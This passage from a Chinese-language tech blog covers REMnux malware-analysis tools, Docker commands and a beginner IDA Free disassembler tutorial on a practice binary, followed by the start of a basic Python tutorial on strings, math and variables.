<p><strong>Hashes:</strong> malwoverview.py, nsrllookup, Automater.py, vt, virustotal-search.py</p>
<p><strong>Files:</strong> yara, scalpel, bulk_extractor, ioc_writer</p>
<p><strong>Other:</strong> dexray, viper, time-decode.py</p>
<h3 id="Other-Analysis-Tasks"><a href="#Other-Analysis-Tasks" class="headerlink" title="Other Analysis Tasks"></a>Other Analysis Tasks</h3><p><strong>Memory Forensics:</strong> vol.py, vol3, linux_mem_diff.py, aeskeyfind, rsakeyfind, bulk_extractor</p>
<p><strong>File Editing:</strong> wxHexEditor, scite, code, xpdf, convert</p>
<p><strong>File Extraction:</strong> 7z, unzip, unrar, cabextract</p>
<h3 id="Use-Docker-Containers-for-Analysis"><a href="#Use-Docker-Containers-for-Analysis" class="headerlink" title="Use Docker Containers for Analysis"></a>Use Docker Containers for Analysis</h3><p><strong>Thug Honeyclient:</strong> remnux/thug</p>
<p><strong>JSDetox JavaScript Analysis:</strong> remnux/jsdetox</p>
<p><strong>Rekall Memory Forensics:</strong> remnux/recall</p>
<p><strong><em>RetDec Decompiler:</em></strong> remnux/retdec</p>
<p><strong>Radare2 Reversing Framework:</strong> remnux/radare2</p>
<p><strong>Ciphey Automatic Decrypter:</strong> remnux/ciphey</p>
<p><strong>Viper Binary Analysis Framework:</strong> remnux/viper</p>
<p><strong>REMnux in a Container:</strong> remnux/remnux-distro</p>
<h3 id="Interact-with-Docker-Images"><a href="#Interact-with-Docker-Images" class="headerlink" title="Interact with Docker Images"></a>Interact with Docker Images</h3><p>List local images</p>
<p>Update local image</p>
<p>Delete local image</p>
<p>Delete unused resources</p>
<p>Open a shell inside a transient container</p>
<p>Map a local TCP port 80 to container’s port 80</p>
<p>Map your current directory into container</p>
<p>docker images</p>
<p>docker pull image</p>
<p>docker rmi imageid</p>
<p>docker system prune</p>
<p>docker run —rm -it image bash</p>
<p>docker run —rm -it -p 80:80 image bash</p>
<p>docker run —rm -it -v .:dir image bash</p>
<h3 id="實作"><a href="#實作" class="headerlink" title="實作"></a>實作</h3><p>在主機建立一個資料夾，方便與虛擬機傳輸檔案</p>
<p><img src="img/rev_Untitled_2.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_3.png" alt="Untitled"></p>
<p>打開虛擬機會看到linux的media目錄下有個sf_…，剛開始會沒有訪問權限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remnux@remnux:/media$ <span class="built_in">sudo</span> adduser <span class="variable">$USER</span> vboxsf</span><br><span class="line"><span class="comment">#新增此命令將目前使用者新增到vboxsf群組，以便當前用戶可以存取共享資料夾</span></span><br></pre></td></tr></table></figure>
<p><img src="img/rev_Untitled_4.png" alt="Untitled"></p>
<hr>
<p> 當執行了reverseinghereo會看到它生成了一個目錄及兩個檔案</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remnux@remnux:~/Downloads$ <span class="built_in">chmod</span> +x reversinghero</span><br><span class="line">remnux@remnux:~/Downloads$ ./reversinghero </span><br><span class="line">@ 1/p1</span><br><span class="line">@ 1/x1</span><br><span class="line">] +</span><br><span class="line">remnux@remnux:~/Downloads$ <span class="built_in">ls</span></span><br><span class="line">1  reversinghero</span><br><span class="line">remnux@remnux:~/Downloads$ <span class="built_in">cd</span> 1</span><br><span class="line">remnux@remnux:~/Downloads/1$ <span class="built_in">ls</span></span><br><span class="line">p1  x1 </span><br><span class="line">remnux@remnux:~/Downloads/1$ <span class="built_in">chmod</span> +x p1 </span><br><span class="line">remnux@remnux:~/Downloads/1$ <span class="built_in">chmod</span> +x p1 x1</span><br><span class="line">remnux@remnux:~/Downloads/1$ ./p1</span><br><span class="line">&gt; 1</span><br><span class="line">] -</span><br><span class="line">remnux@remnux:~/Downloads/1$ ./x1</span><br><span class="line">? ww</span><br><span class="line">! -</span><br><span class="line">remnux@remnux:~/idafree-8.3$ ./ida64  &amp;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p> 把目錄下可執行檔丟到IDA查看</p>
<ul>
<li>圖形視圖</li>
<li>了解控制項流程</li>
</ul>
<p><img src="img/rev_Untitled_5.png" alt="Untitled"></p>
<p>按空白鍵切換線性視圖，在按一次空白鍵可以切回圖形視圖</p>
<p>往下滾動，地址增加</p>
<p><img src="img/rev_Untitled_6.png" alt="Untitled"></p>
<ul>
<li>載入部分</li>
<li>資料結構、擁有的字串</li>
</ul>
<p><img src="img/rev_Untitled_7.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_8.png" alt="Untitled"></p>
<ul>
<li>BSS</li>
<li>未初始化資料部分</li>
</ul>
<p><img src="img/rev_Untitled_9.png" alt="Untitled"></p>
<ul>
<li>外部部分</li>
<li>為系統提供外部功能</li>
</ul>
<p><img src="img/rev_Untitled_10.png" alt="Untitled"></p>
<p>如果遇到警告，表示不再函數中，要回到函數中，最快的做法是點擊上方藍色區域，或是左側function name</p>
<p>藍色區塊主要是函數、程式、程式碼</p>
<p>灰色是數據</p>
<p><img src="img/rev_Untitled_11.png" alt="Untitled"></p>
<p>點擊左側_start回到函數起點</p>
<p><img src="img/rev_Untitled_12.png" alt="Untitled"></p>
<ul>
<li>綠色箭頭<ul>
<li>測試為True時他將發生因此轉到指定部分</li>
</ul>
</li>
<li>測試為False時，紅色箭頭就出現所以會到特定部分</li>
<li>藍色箭頭<ul>
<li>將發生跳躍</li>
<li>即使之前沒有測試</li>
<li>有時也用於將一個區塊分為兩個小的區塊，更容易可視化</li>
</ul>
</li>
</ul>
<p>想移動圖表，按住滑鼠左鍵拖曳</p>
<p>想放大縮小，按住Control，並捲動視圖</p>
<p>如果按鍵盤上的1會返回正常縮放，也就是100%</p>
<p>有看到上面一條條的小間隙，代表那區段是======XXX=====</p>
<p><img src="img/rev_Untitled_13.png" alt="Untitled"></p>
<p>想查看字節 &gt; Options&gt;General</p>
<p>修改成6 or 8，將顯示8位元組</p>
<p><img src="img/rev_Untitled_14.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_15.png" alt="Untitled"></p>
<p>如果看到位元組顯示了一個+號或…代表指令佔用了超過8個位元組</p>
<p>每條指令位元組並不相同</p>
<p>除了在線性視圖中可以顯示字節</p>
<p>圖形視圖也是通過同樣的方式修改，記得切換到圖形視圖的介面</p>
<p><img src="img/rev_Untitled_16.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_17.png" alt="Untitled"></p>
<h3 id="功能之間導航"><a href="#功能之間導航" class="headerlink" title="功能之間導航"></a>功能之間導航</h3><p>假設是入口點開始_start</p>
<p>透過雙擊函數printf進入函數查看該功能，或按Control + enter</p>
<p><img src="img/rev_Untitled_18.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_19.png" alt="Untitled"></p>
<p>要返回先前位置按esc，如果在IDA中忘記先前所在的位置，按esc直到回到要的地方</p>
<p>轉換數字的進制</p>
<ul>
<li>右鍵選擇要轉換的進制</li>
<li>按h會轉換成10進制</li>
<li>按b會轉換成2進制</li>
</ul>
<p><img src="img/rev_Untitled_20.png" alt="Untitled"></p>
<p>查看函數在哪些地方被呼叫，對目標函數按X</p>
<p><img src="img/rev_Untitled_21.png" alt="Untitled"></p>
<p>重新命名標籤和函數</p>
<ul>
<li>知道該函數作用就能重新命名</li>
<li>透過讀取函數名稱更容易知道他的功能</li>
<li>知道自己已經分析過這函數</li>
</ul>
<p>右鍵點擊函數命名，快捷鍵按N</p>
<p><img src="img/rev_Untitled_22.png" alt="Untitled"></p>
<p>如果想恢復預設名稱，回到重新命名的畫面，並刪除名稱框中的字</p>
<h3 id="註解"><a href="#註解" class="headerlink" title="註解"></a>註解</h3><p>在某行上方插入註解</p>
<p>fn+insert</p>
<p><img src="img/rev_Untitled_23.png" alt="Untitled"></p>
<p>在該行註解內容直接輸入 ;</p>
<p>某行下方新增註解或指令，fn+shift+insert</p>
<p>; 是為了跟指令區分開</p>
<h3 id="搜尋"><a href="#搜尋" class="headerlink" title="搜尋"></a>搜尋</h3><p>找位元組序列，按alt+B貼上想要搜尋的字節</p>
<p>右鍵先複製要搜尋的字節，比如這邊複製<strong>4B BE</strong> &gt; Search &gt; Sequence of Bytes</p>
<p><img src="img/rev_Untitled_24.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_25.png" alt="Untitled"></p>
<p>他會列出所有找到48 BE的位置</p>
<p><img src="img/rev_Untitled_26.png" alt="Untitled"></p>
<p>同樣能利用Sequence of Bytes 進入後搜尋特定字串</p>
<p><img src="img/rev_Untitled_27.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_28.png" alt="Untitled"></p>
<p>搜尋參數、指令</p>
<ul>
<li>複製目標指令</li>
<li>記得加0x接指令，比如這邊是0x0A，16進制的意思</li>
</ul>
<p><img src="img/rev_Untitled_29.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_30.png" alt="Untitled"></p>
<p>字串搜尋</p>
<ul>
<li>文件越大搜索速度越慢</li>
<li>搜尋整個線性視圖中所有的字串、內容</li>
</ul>
<p><img src="img/rev_Untitled_31.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_32.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_33.png" alt="Untitled"></p>
<p>字串或文字搜尋評論</p>
<ul>
<li>選擇function，切換到線性視圖</li>
<li>Alt+T搜索</li>
</ul>
<p><img src="img/rev_Untitled_34.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_35.png" alt="Untitled"></p>
<h3 id="數據探索"><a href="#數據探索" class="headerlink" title="數據探索"></a>數據探索</h3><ul>
<li>程式碼或資料轉換為程式碼</li>
<li>程式碼轉換為資料</li>
</ul>
<p>識別程式並將其與資料區分開</p>
<p>介入並嘗試用未知資料創建程式碼的地方</p>
<p>在數據部分，看到一串字串，按 <code>A</code> 將資料中的所有位元組組合成一個字串</p>
<ul>
<li>或是按Edit &gt; Strings &gt; String 組合字串</li>
</ul>
<p><code>u</code> 表示未定義來取消定義並返回到先前的狀態</p>
<ul>
<li>按Edit &gt; Undefine</li>
</ul>
<p><img src="img/rev_Untitled_36.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_37.png" alt="Untitled"></p>
<p>可以將字串組合成一個字</p>
<ul>
<li>word (2 bytes)</li>
<li>dword (4 bytes)</li>
<li>qword (8bytes)</li>
</ul>
<p>一個字兩個位元組，按 <code>d</code> 組合成dword，在按 <code>d</code> 把八個位元組組合成一個關鍵字</p>
<p>有些地方已經被定義，按 <code>u</code> 取消某些地方指令的定義，將會返回到原始資料位元組</p>
<ul>
<li>如果返回圖表視圖，會發現顯示上的錯誤</li>
</ul>
<p><img src="img/rev_Untitled_38.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_39.png" alt="Untitled"></p>
<p>現在指令是未定義的，返回原始資料位元組</p>
<p><img src="img/rev_Untitled_40.png" alt="Untitled"></p>
<p>P = Make function<br>C = Convert to Code</p>
<h3 id="嘗試修復"><a href="#嘗試修復" class="headerlink" title="嘗試修復"></a>嘗試修復</h3><p>選擇剛剛被取消定義的地方，按c，但仍然能看到錯誤</p>
<p><img src="img/rev_Untitled_41.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_42.png" alt="Untitled"></p>
<p>為了修復錯誤，需要取消整個函數的定義</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**sub_400728**      proc near               ; CODE XREF: _start+46↑p</span><br><span class="line">.text:0000000000400728                 push    r12</span><br><span class="line">.text:000000000040072A                 push    r13</span><br><span class="line">.text:000000000040072C                 push    r13</span><br><span class="line">.text:000000000040072E                 <span class="built_in">test</span>    rsi, rsi</span><br><span class="line">.text:0000000000400731                 jz      short loc_400764</span><br><span class="line">.text:0000000000400733                 mov     r12, rdi</span><br><span class="line">.text:0000000000400736                 mov     r13, rdx</span><br><span class="line">.text:0000000000400739                 call    _fgets</span><br><span class="line">.text:000000000040073E                 <span class="built_in">test</span>    rax, rax</span><br><span class="line">.text:0000000000400741                 jz      short loc_400761</span><br><span class="line">.text:0000000000400743                 mov     rdi, r12        ; s</span><br><span class="line">.text:0000000000400746                 mov     rsi, offset reject ; <span class="string">&quot;\n&quot;</span></span><br><span class="line">.text:0000000000400750                 call    _strcspn</span><br><span class="line">.text:0000000000400755                 xor     edx, edx</span><br><span class="line">.text:0000000000400757                 xchg    dl, [r12+rax]</span><br><span class="line">.text:000000000040075B                 cmp     rdx, 0Ah</span><br><span class="line">.text:000000000040075F                 jz      short loc_400764</span><br><span class="line">.text:0000000000400761</span><br><span class="line">.text:0000000000400761 loc_400761:                             ; CODE XREF: sub_400728+19↑j</span><br><span class="line">.text:0000000000400761                 xor     r12, r12</span><br><span class="line">.text:0000000000400764</span><br><span class="line">.text:0000000000400764 loc_400764:                             ; CODE XREF: sub_400728+9↑j</span><br><span class="line">.text:0000000000400764                                         ; sub_400728+37↑j</span><br><span class="line">.text:0000000000400764                 mov     rax, r12</span><br><span class="line">.text:0000000000400767                 pop     r13</span><br><span class="line">.text:0000000000400769                 pop     r13</span><br><span class="line">.text:000000000040076B                 pop     r12</span><br><span class="line">.text:000000000040076D                 retn</span><br><span class="line">.text:000000000040076D sub_400728      endp ; sp-analysis failed</span><br><span class="line">.text:000000000040076D</span><br><span class="line">.text:000000000040076D _text           **ends**</span><br></pre></td></tr></table></figure>
<p><img src="img/rev_Untitled_43.png" alt="Untitled"></p>
<p>選取完後按 <code>u</code> 取消內容的定義</p>
<p>接下來對函數起始按 <code>p</code> 操作進行修復</p>
<p>按回圖形視圖沒有錯誤就代表修復成功</p>
<p><img src="img/rev_Untitled_44.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_45.png" alt="Untitled"></p>
<ul>
<li>將資料的任何部分變更為程式碼，也可以將程式碼的任何部分變更為資料</li>
<li>可以修改資料型別等</li>
<li>有時 IDA可能會誤解數據並錯誤地將其視為程式碼，需要撤消它並修復它</li>
</ul>
<h3 id="開啟另一個反彙編窗口"><a href="#開啟另一個反彙編窗口" class="headerlink" title="開啟另一個反彙編窗口"></a>開啟另一個反彙編窗口</h3><p>View &gt; Open subviews &gt; Disassembly</p>
<p>如果需要同時查看程式碼的兩個不同部分，可以這樣做</p>
<p>快捷鍵是 alt +2 /alt +3，快速切換兩個畫面</p>
<p><img src="img/rev_Untitled_46.png" alt="Untitled"></p>
<p>16進位視圖會跟主視圖同步</p>
<p><img src="img/rev_Untitled_47.png" alt="Untitled"></p>
<p>功能視窗</p>
<p><img src="img/rev_Untitled_48.png" alt="Untitled"></p>
<p>IDA如果知道函數功能會有標記像是_fclose、_printf…</p>
<p>不知道的函數功能會像是 sub_4005BF..</p>
<p>可以分析後了解作用隨時重新命名</p>
<p>字串視窗</p>
<p>View &gt; Open subviews &gt; Strings</p>
<p><img src="img/rev_Untitled_49.png" alt="Untitled"></p>
<p>快捷鍵是shift+F12</p>
<p>單擊任何一個字串，指引到該程式引用區塊</p>
<p>Imports</p>
<ul>
<li>包含可執行檔所依賴的所有函數的清單</li>
<li>了解可執行檔的功能</li>
<li>透過名稱知道作用</li>
</ul>
<p><img src="img/rev_Untitled_50.png" alt="Untitled"></p>
<p>Exports</p>
<ul>
<li>主要是入口點 start</li>
</ul>
<p><img src="img/rev_Untitled_51.png" alt="Untitled"></p>
<p>結構 Structures</p>
<p><img src="img/rev_Untitled_52.png" alt="Untitled"></p>
<ul>
<li>將某種資料結構強加於在內部找到的原始資料</li>
<li>要建立一個新結構，按fn + insert</li>
</ul>
<p><img src="img/rev_Untitled_53.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_54.png" alt="Untitled"></p>
<p>滑鼠點到ends後按 <code>d</code> 會新增一行指令</p>
<p>再次按d → dword → 4bytes…</p>
<p>要在建立新的字段一樣到ends後按 <code>d</code></p>
<p>對欄位取有意義的名稱，按 <code>n</code> ，每個欄位大小Dword → 4bytes,這邊命名x,y,z</p>
<p><img src="img/rev_Untitled_55.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_56.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_57.png" alt="Untitled"></p>
<p>發現了一些偏移量，像是結構的一部分，透過按 <code>T</code> 選擇懷疑是結構的位置相符的結構</p>
<p><img src="img/rev_Untitled_58.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_59.png" alt="Untitled"></p>
<h3 id="保存檔案"><a href="#保存檔案" class="headerlink" title="保存檔案"></a>保存檔案</h3><ul>
<li>File &gt; Save</li>
<li>Control + w</li>
</ul>
<p>保存後會出現 <code>.i64</code> 檔案，可以將此文件提供給團隊或其他人開啟，並取得你在此專案中所做的相同資料庫和分析</p>
<p><img src="img/rev_Untitled_60.png" alt="Untitled"></p>
<p>建立快照</p>
<p><img src="img/rev_Untitled_61.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_62.png" alt="Untitled"></p>
<p>要恢復回快照的紀錄，點選快照並按Restore</p>
<p>每次建立快照會建立一個包含時間和日期的新資料庫</p>
<p>這也是您可以提供給您的隊友或專案中的任何人的文件</p>
<p><img src="img/rev_Untitled_63.png" alt="Untitled"></p>
<p>如果犯了錯誤想撤銷，按Ctrl+z</p>
<p>File &gt; close &gt; Pack database (store)</p>
<p>打包完剩兩個檔案，重新打開項目按 <code>.i64</code></p>
<p><img src="img/rev_Untitled_64.png" alt="Untitled"></p>
<p><img src="img/rev_Untitled_65.png" alt="Untitled"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-Python" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Python/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.092Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Python/">
        Learn Python
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <ul>
<li>Strings</li>
<li>Tuples</li>
<li>Math</li>
<li>Looping</li>
<li>Variables&amp;Methods</li>
<li>Importing Modules</li>
<li>Functions</li>
<li>Advanced Strings</li>
<li>Boolean Expressions</li>
<li>Dictionaries</li>
<li>Relational Operators</li>
<li>Sockets</li>
<li>Conditional Statements</li>
<li>Tool Building</li>
<li>Lists</li>
</ul>
<hr>
<h3 id="str-string-資料型別"><a href="#str-string-資料型別" class="headerlink" title="str (string)資料型別"></a><code>str</code> (string)資料型別</h3><ul>
<li>用單引號 (‘ ‘) 或雙引號 (“ “) 括起來的字元序列</li>
<li>Python 中的字串是不可變的</li>
<li>創建後就無法更改</li>
<li><p>Creation</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_string = <span class="string">&#x27;Hello, World!&#x27;</span> <span class="keyword">or</span> my_string = <span class="string">&quot;Hello, World!&quot;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Accessing Characters</p>
<ul>
<li><p>您可以使用索引存取字串中的各個字符，從 0 開始</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(my_string[<span class="number">0</span>]) </span><br><span class="line"><span class="comment"># &#x27;H&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>String Concatenation</p>
<ul>
<li><p>您可以使用 + 運算子連接（連接）兩個或多個字串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">greeting = <span class="string">&#x27;Hello&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;World!&#x27;</span> </span><br><span class="line"><span class="comment"># &#x27;Hello World!&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>String Length</p>
<ul>
<li><p>len() 函數可用於確定字串的長度（字元數）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(my_string))</span><br><span class="line"><span class="comment"># output the length of the string</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>String Slicing</p>
<ul>
<li><p>您可以使用切片從字串中提取子字串，並指定開始和結束索引。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">substring = my_string[<span class="number">7</span>:<span class="number">12</span>] </span><br><span class="line"><span class="comment"># extract the substring &#x27;World&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>String Methods</p>
<ul>
<li><p>Python 提供了各種內建方法來操作和轉換字串。範例包括 upper()、lower()、strip()、split()、replace() 等。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(my_string.upper()) </span><br><span class="line"><span class="comment"># output &#x27;HELLO, WORLD!&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>String Formatting</p>
<ul>
<li><p>字串格式允許您在字串中嵌入值。這可以使用 % 運算子或 format() 方法來完成。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;Alice&#x27;</span></span><br><span class="line">age = <span class="number">30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My name is %s and I&#x27;m %d years old.&quot;</span> % (name, age))</span><br><span class="line"><span class="comment"># Output: My name is Alice and I&#x27;m 30 years old.</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>練習</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print string</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello,world!&quot;</span>)<span class="comment">#hello,world!</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello,world!&#x27;</span>)<span class="comment">#hello,world!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#triple quote for multi-line</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;this string runs </span></span><br><span class="line"><span class="string">mutiple lines!&quot;&quot;&quot;</span>) </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">this string runs </span></span><br><span class="line"><span class="string">mutiple lines!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># we can also concatenate</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;this string is &quot;</span>+<span class="string">&quot;awesome!&quot;</span>) <span class="comment">#this string is awesome!</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#new line</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;test that new line out&quot;</span>) <span class="comment">#test that new line out</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><ul>
<li>提供各種數學函數和常數</li>
<li>允許您在 Python 程式中執行高級數學運算</li>
<li><p>Math Functions in the <code>math</code> Module</p>
<ul>
<li><p>計算 x 的平方根</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">math.sqrt(x)</span><br></pre></td></tr></table></figure>
</li>
<li><p>x 的 y 次方</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">math.<span class="built_in">pow</span>(x, y)</span><br></pre></td></tr></table></figure>
</li>
<li><p>計算 x 的指數值 (e^x)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">math.exp(x)</span><br></pre></td></tr></table></figure>
</li>
<li><p>計算 x 的自然對數（以 e 為底）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">math.log(x)</span><br></pre></td></tr></table></figure>
</li>
<li><p>計算 x 以 10 為底的對數</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">math.log10(x)</span><br></pre></td></tr></table></figure>
</li>
<li><p>分別計算x的正弦、餘弦和正切（其中x以弧度為單位）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">math.sin(x), math.cos(x), math.tan(x)</span><br></pre></td></tr></table></figure>
</li>
<li><p>將x從弧度轉換為度數</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">math.degrees(x)</span><br></pre></td></tr></table></figure>
</li>
<li><p>將x從度數轉換為弧度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">math.radians(x)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Math Operators</p>
<ul>
<li>Addition (<code>+</code>)<ul>
<li>將兩個數字相加</li>
</ul>
</li>
<li>Subtraction (<code>-</code>)<ul>
<li>一個數字減去另一個數字</li>
</ul>
</li>
<li>Multiplication (<code>*</code>)<ul>
<li>將兩個數字相乘</li>
</ul>
</li>
<li>Division (<code>/</code>)<ul>
<li>一個數字除以另一個數字</li>
</ul>
</li>
<li>Integer Division (<code>//</code>)<ul>
<li>執行除法並以整數形式返回商數（向下捨去）</li>
</ul>
</li>
<li>Modulo (<code>%</code>)<ul>
<li>傳回除法的餘數</li>
</ul>
</li>
<li><p>Exponentiation (<code>**</code>)</p>
<ul>
<li>計算數字的冪</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="comment"># Using math functions </span></span><br><span class="line"><span class="built_in">print</span>(math.sqrt(<span class="number">25</span>)) <span class="comment"># Output: 5.0 </span></span><br><span class="line"><span class="built_in">print</span>(math.<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">3</span>)) <span class="comment"># Output: 8.0 </span></span><br><span class="line"><span class="built_in">print</span>(math.sin(math.pi/<span class="number">2</span>)) <span class="comment"># Output: 1.0 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Using math operators </span></span><br><span class="line">x = <span class="number">10</span> y = <span class="number">3</span> <span class="built_in">print</span>(x + y) <span class="comment"># Output: 13 </span></span><br><span class="line"><span class="built_in">print</span>(x / y) <span class="comment"># Output: 3.3333333333333335 </span></span><br><span class="line"><span class="built_in">print</span>(x // y) <span class="comment"># Output: 3 </span></span><br><span class="line"><span class="built_in">print</span>(x % y) <span class="comment"># Output: 1 </span></span><br><span class="line"><span class="built_in">print</span>(x ** y) <span class="comment"># Output: 1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span>+<span class="number">50</span>)<span class="comment">#100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#subtract</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span>-<span class="number">50</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#multiply</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span>*<span class="number">50</span>)<span class="comment">#2500</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#divide</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span>/<span class="number">50</span>)<span class="comment">#1.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#PEMDAS</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span>+<span class="number">50</span>-<span class="number">50</span>*<span class="number">50</span>/<span class="number">50</span>)<span class="comment">#50.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exponents</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span>**<span class="number">2</span>)<span class="comment">#2500</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#modulo - takes what is left over</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span> % <span class="number">6</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#divison with remainder (or a float)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span>/<span class="number">6</span>)<span class="comment">#8.333333333333334</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#no remainder</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span>//<span class="number">6</span>)<span class="comment">#8</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="variables-and-methods"><a href="#variables-and-methods" class="headerlink" title="variables and methods"></a>variables and methods</h3><ul>
<li><p>variables</p>
<ul>
<li>命名的儲存位置</li>
<li>儲存資料或值</li>
<li>在整個程式的計算中存取、修改或使用的資料的佔位符</li>
<li>動態類型</li>
<li><p>資料類型可以在程式執行期間改變</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Variable assignment</span></span><br><span class="line">x = <span class="number">10</span></span><br><span class="line">name = <span class="string">&quot;John&quot;</span></span><br><span class="line">is_true = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Variable usage</span></span><br><span class="line">y = x + <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello, &quot;</span> + name)</span><br><span class="line"><span class="keyword">if</span> is_true:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The condition is true&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">x、name 和 is_true 是分配有不同資料類型</span></span><br><span class="line"><span class="string">用於計算和列印語句以執行運算和顯示值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>Methods</p>
<ul>
<li>執行特定任務或操作的可重複使用程式碼區塊</li>
<li>方法與物件或類別相關聯，並被呼叫來執行某些操作</li>
<li>稱為函數</li>
<li><p>內建函數和使用者定義函數都屬於方法類別</p>
